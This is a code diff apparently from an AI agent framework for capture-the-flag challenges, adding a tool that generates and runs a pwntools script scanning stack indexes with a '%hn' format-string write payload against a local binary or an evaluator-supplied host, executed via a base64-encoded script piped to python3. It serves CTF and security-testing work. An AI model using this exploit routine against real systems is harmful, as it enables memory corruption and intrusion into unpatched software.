@@ -338,6 +338,82 @@ io.close()
     return fmtstr_probe
 
 
+@register_tool(name="fmtstr_write_scan", groups=["pwn"])
+def make_fmtstr_write_scan(*, env: CTFEnvironment, state=None, **_) -> object:
+    from langchain_core.tools import tool
+
+    remote = str(((state or {}).get("challenge") or {}).get("remote") or "")
+
+    @tool
+    async def fmtstr_write_scan(
+        value: int,
+        mode: str = "target",
+        binary: str = "",
+        prompt: str = ">> ",
+        start_index: int = 1,
+        end_index: int = 30,
+    ) -> str:
+        """Try a bounded positional ``%hn`` write for a stack-resident pointer.
+
+        Use only after static/dynamic evidence shows an uncontrolled printf, a
+        desired 16-bit value, and a likely pointer already present in printf's
+        argument area. Each index gets a fresh local process or target
+        connection. Output is whitespace-compacted and scanning stops on a flag
+        shaped response or an explicit success message.
+        """
+        normalized = {"remote": "target", "local_process": "local"}.get(
+            mode.strip().lower(), mode.strip().lower()
+        )
+        if normalized not in {"local", "target"}:
+            raise ValueError("mode must be local or target")
+        if not 1 <= value <= 0xFFFF:
+            raise ValueError("value must fit one non-zero 16-bit halfword")
+        if start_index < 1 or end_index < start_index or end_index > 100:
+            raise ValueError("format-string index range must be within 1..100")
+        if end_index - start_index + 1 > 40:
+            raise ValueError("one scan may cover at most 40 indexes")
+        host = ""
+        port = 0
+        if normalized == "local":
+            if not binary:
+                raise ValueError("local mode requires a binary")
+        else:
+            if not remote or ":" not in remote:
+                raise ValueError("target mode requires an evaluator-provided host:port")
+            host, raw_port = remote.rsplit(":", 1)
+            if not host or not raw_port.isdigit() or not 1 <= int(raw_port) <= 65535:
+                raise ValueError("the evaluator-provided target is not host:port")
+            port = int(raw_port)
+        program = f"""from pwn import *
+context.log_level = 'error'
+for index in range({start_index}, {end_index + 1}):
+    io = None
+    try:
+        io = process({binary!r}) if {normalized!r} == 'local' else remote({host!r}, {port})
+        if {prompt!r}:
+            io.recvuntil({prompt!r}.encode(), timeout=2)
+        payload = f'%{{{value}}}c%{{index}}$hn'.encode()
+        io.sendline(payload)
+        data = io.recvrepeat(1)
+        text = data.decode(errors='replace')
+        compact = ' '.join(text.split())[-1200:]
+        print(f'[index={{index}}] {{compact}}')
+        lowered = text.lower()
+        if ('{{' in text and '}}' in text) or 'managed to deceive' in lowered:
+            break
+    except Exception as exc:
+        print(f'[index={{index}} error={{type(exc).__name__}}]')
+    finally:
+        if io is not None:
+            io.close()
+"""
+        encoded = base64.b64encode(program.encode()).decode()
+        command = f"printf %s {encoded} | base64 -d | python3 -"
+        return _result_text(await env.exec(command, timeout=180))
+
+    return fmtstr_write_scan
+
+
 @register_tool(name="r2_interact", groups=["reverse", "pwn"])
 def make_r2_interact(*, env: CTFEnvironment, **_) -> object:
     from langchain_core.tools import tool
